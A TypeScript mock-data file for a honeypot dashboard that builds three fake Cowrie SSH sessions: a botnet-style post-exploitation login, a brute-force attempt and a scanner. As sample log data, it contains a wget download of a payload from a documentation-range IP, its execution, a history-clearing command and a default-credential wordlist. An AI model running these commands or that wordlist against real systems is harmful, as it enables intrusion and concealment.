/**
 * Mock Cowrie SSH honeypot sessions for Phase 1 (no backend yet).
 *
 * Three sessions, newest first:
 *   1. c0a8e1f2b3d4  post-exploitation: logs in, runs recon, downloads a payload
 *   2. 7f3b9d21a6e0  credential brute force: 214 events, truncated to the first 24
 *   3. e41d0c7a95b8  automated scanner: banner grab and disconnect, no login
 *
 * SAFETY: nothing here points at real infrastructure.
 *  - Every IP is from the RFC 5737 documentation ranges (192.0.2.0/24,
 *    198.51.100.0/24, 203.0.113.0/24), which are never routed on the internet.
 *  - The download URL uses one of those IPs, so it cannot resolve to a live host.
 *  - Hashes are SHA-256 / MD5 of descriptive strings like
 *    "honeytrace mock payload x86_64 (not real malware)", so they match no real file.
 *  - Geo fields for these IPs are invented.
 *
 * Each session is written as a short script of events (seconds offset +
 * Cowrie fields). buildSession() derives timestamps, event IDs, the raw Cowrie
 * JSON line, duration, and counts from that script, so they always agree.
 */
import type { HoneypotEvent, HoneypotSession } from "../types/honeypot";

export type { HoneypotEvent, HoneypotSession };

const SENSOR = "cowrie-01";
const HONEYPOT_IP = "10.0.0.5"; // the sensor's own (private) address
const HONEYPOT_PORT = 22;

// Fake fingerprints (see SAFETY above)
const PAYLOAD_SHA256 = "70830fa1e97e295d48cd44203e11de803979da6d5151b186bd3f10ed55ed52b8";
const HASSH_GO = "9b35a5c633e3495da695c8cd31dedd5e";
const HASSH_PARAMIKO = "533fad0485b4d71fd9608df712d96be6";
const HASSH_LIBSSH = "2faa080982c044fe1f7a60d5b17e5560";

// --- builder ----------------------------------------------------------------

/** One scripted event. `extra` holds Cowrie fields that only appear in `raw`. */
type EventScript = {
  /** seconds after session start (fractions allowed) */
  at: number;
  eventType: string;
  message: string;
  username?: string;
  password?: string;
  command?: string;
  fileHash?: string;
  extra?: Record<string, unknown>;
};

type SessionScript = {
  sessionId: string;
  srcIp: string;
  srcPort: number;
  srcGeo: HoneypotSession["srcGeo"];
  startTime: string; // ISO-8601 UTC
  /** Session length in seconds. Required when the event list is truncated. */
  durationSeconds?: number;
  /** Total events Cowrie recorded. Defaults to the scripted count. */
  totalEvents?: number;
  events: EventScript[];
};

/** ISO timestamp `seconds` after `startIso`, millisecond precision. */
function offset(startIso: string, seconds: number): string {
  return new Date(Date.parse(startIso) + Math.round(seconds * 1000)).toISOString();
}

function buildSession(s: SessionScript): HoneypotSession {
  const events: HoneypotEvent[] = s.events.map((e, i) => {
    const timestamp = offset(s.startTime, e.at);
    // Field order mirrors Cowrie's JSON output closely enough to look authentic.
    const raw = JSON.stringify({
      eventid: e.eventType,
      ...(e.username !== undefined && { username: e.username }),
      ...(e.password !== undefined && { password: e.password }),
      ...(e.command !== undefined && { input: e.command }),
      ...(e.fileHash !== undefined && { shasum: e.fileHash }),
      ...e.extra,
      message: e.message,
      sensor: SENSOR,
      timestamp: timestamp.replace("Z", "000Z"), // Cowrie logs microseconds
      src_ip: s.srcIp,
      session: s.sessionId,
    });
    return {
      eventId: `${s.sessionId}-${String(i + 1).padStart(4, "0")}`,
      timestamp,
      eventType: e.eventType,
      username: e.username ?? null,
      password: e.password ?? null,
      command: e.command ?? null,
      fileHash: e.fileHash ?? null,
      raw,
    };
  });

  const durationSeconds = s.durationSeconds ?? s.events[s.events.length - 1].at;
  const eventCount = s.totalEvents ?? events.length;

  return {
    sessionId: s.sessionId,
    srcIp: s.srcIp,
    srcGeo: s.srcGeo,
    startTime: s.startTime,
    endTime: offset(s.startTime, durationSeconds),
    durationSeconds: Math.round(durationSeconds * 10) / 10,
    eventCount,
    truncated: eventCount > events.length,
    events,
  };
}

/** Shared opening every SSH session has: TCP connect, client banner, key exchange. */
function handshake(
  srcIp: string,
  srcPort: number,
  sessionId: string,
  clientVersion: string,
  hassh: string,
  start = 0,
): EventScript[] {
  return [
    {
      at: start,
      eventType: "cowrie.session.connect",
      message: `New connection: ${srcIp}:${srcPort} (${HONEYPOT_IP}:${HONEYPOT_PORT}) [session: ${sessionId}]`,
      extra: { src_port: srcPort, dst_ip: HONEYPOT_IP, dst_port: HONEYPOT_PORT, protocol: "ssh" },
    },
    {
      at: start + 0.21,
      eventType: "cowrie.client.version",
      message: `Remote SSH version: ${clientVersion}`,
      extra: { version: clientVersion },
    },
    {
      at: start + 0.44,
      eventType: "cowrie.client.kex",
      message: `SSH client hassh fingerprint: ${hassh}`,
      extra: { hassh },
    },
  ];
}

const loginFailed = (at: number, username: string, password: string): EventScript => ({
  at,
  eventType: "cowrie.login.failed",
  username,
  password,
  message: `login attempt [${username}/${password}] failed`,
});

const cmd = (at: number, command: string): EventScript => ({
  at,
  eventType: "cowrie.command.input",
  command,
  message: `CMD: ${command}`,
});

// --- 1. Post-exploitation ---------------------------------------------------
// Logs in on the third guess, fingerprints the box (OS, privileges, CPU, RAM),
// moves to a writable directory, downloads a payload, and tries to run it.
// This is the classic pattern of an IoT/Linux botnet dropper.

const POST_EXPLOIT_IP = "203.0.113.47";
const PAYLOAD_URL = "http://198.51.100.77/bins/x86_64";

const postExploitation = buildSession({
  sessionId: "c0a8e1f2b3d4",
  srcIp: POST_EXPLOIT_IP,
  srcPort: 51122,
  srcGeo: { country: "Netherlands", city: "Amsterdam" },
  startTime: "2026-10-19T06:12:03.118Z",
  events: [
    ...handshake(POST_EXPLOIT_IP, 51122, "c0a8e1f2b3d4", "SSH-2.0-Go", HASSH_GO),
    loginFailed(1.02, "root", "root"),
    loginFailed(1.87, "root", "123456"),
    {
      at: 2.65,
      eventType: "cowrie.login.success",
      username: "root",
      password: "admin123",
      message: "login attempt [root/admin123] succeeded",
    },
    cmd(3.41, "uname -a"),
    cmd(3.9, "id"),
    cmd(4.37, "cat /proc/cpuinfo | grep name | wc -l"),
    cmd(4.85, "free -m | grep Mem | awk '{print $2}'"),
    cmd(5.6, "cd /tmp || cd /var/run || cd /dev/shm"),
    cmd(6.12, `wget ${PAYLOAD_URL} -O .sysd`),
    {
      at: 7.94,
      eventType: "cowrie.session.file_download",
      fileHash: PAYLOAD_SHA256,
      message: `Downloaded URL (${PAYLOAD_URL}) with SHA-256 ${PAYLOAD_SHA256} to var/lib/cowrie/downloads/${PAYLOAD_SHA256}`,
      extra: { url: PAYLOAD_URL, outfile: `var/lib/cowrie/downloads/${PAYLOAD_SHA256}` },
    },
    cmd(8.31, "chmod +x .sysd"),
    cmd(8.77, "./.sysd"),
    {
      at: 8.78,
      eventType: "cowrie.command.failed",
      command: "./.sysd",
      message: "Command not found: ./.sysd",
    },
    cmd(9.5, "rm -f .sysd; history -c"),
    cmd(10.02, "exit"),
    {
      at: 10.4,
      eventType: "cowrie.session.closed",
      message: "Connection lost after 10.4 seconds",
      extra: { duration: "10.4" },
    },
  ],
});

// --- 2. Credential brute force ----------------------------------------------
// A password-spraying tool cycling through a default-credential wordlist
// roughly every 0.2-0.3s. Cowrie logged 214 events over ~47s; only the first
// 24 are kept here (truncated: true), as a real API would page them.

const BRUTE_IP = "198.51.100.23";
const WORDLIST: [string, string][] = [
  ["root", "123456"], ["root", "password"], ["admin", "admin"], ["root", "root"],
  ["root", "12345678"], ["ubuntu", "ubuntu"], ["pi", "raspberry"], ["root", "toor"],
  ["user", "user"], ["test", "test"], ["oracle", "oracle"], ["postgres", "postgres"],
  ["root", "1qaz2wsx"], ["admin", "1234"], ["root", "admin"], ["git", "git"],
  ["ftpuser", "ftpuser"], ["root", "Passw0rd"], ["deploy", "deploy"], ["root", "qwerty"],
  ["support", "support"],
];

const bruteForce = buildSession({
  sessionId: "7f3b9d21a6e0",
  srcIp: BRUTE_IP,
  srcPort: 40388,
  srcGeo: { country: "Vietnam", city: "Hanoi" },
  startTime: "2026-10-19T02:03:47.502Z",
  durationSeconds: 47.3,
  totalEvents: 214,
  events: [
    ...handshake(BRUTE_IP, 40388, "7f3b9d21a6e0", "SSH-2.0-paramiko_3.4.0", HASSH_PARAMIKO),
    // Slightly irregular spacing, like a real tool under network jitter
    ...WORDLIST.map(([u, p], i) => loginFailed(0.71 + i * 0.22 + (i % 3) * 0.013, u, p)),
  ],
});

// --- 3. Automated scanner ---------------------------------------------------
// Internet-wide scanner: connects, records the SSH banner and key-exchange
// fingerprint, and leaves without trying to log in. Geo lookup failed (null).

const SCANNER_IP = "192.0.2.118";

const scanner = buildSession({
  sessionId: "e41d0c7a95b8",
  srcIp: SCANNER_IP,
  srcPort: 60514,
  srcGeo: null,
  startTime: "2026-10-18T22:41:15.880Z",
  events: [
    ...handshake(SCANNER_IP, 60514, "e41d0c7a95b8", "SSH-2.0-libssh_0.9.6", HASSH_LIBSSH),
    {
      at: 1.6,
      eventType: "cowrie.session.closed",
      message: "Connection lost after 1.6 seconds",
      extra: { duration: "1.6" },
    },
  ],
});

// --- exports ----------------------------------------------------------------

/** All mock sessions, newest first. */
export const mockSessions: HoneypotSession[] = [postExploitation, bruteForce, scanner];

export function getMockSession(sessionId: string): HoneypotSession | undefined {
  return mockSessions.find((s) => s.sessionId === sessionId);
}
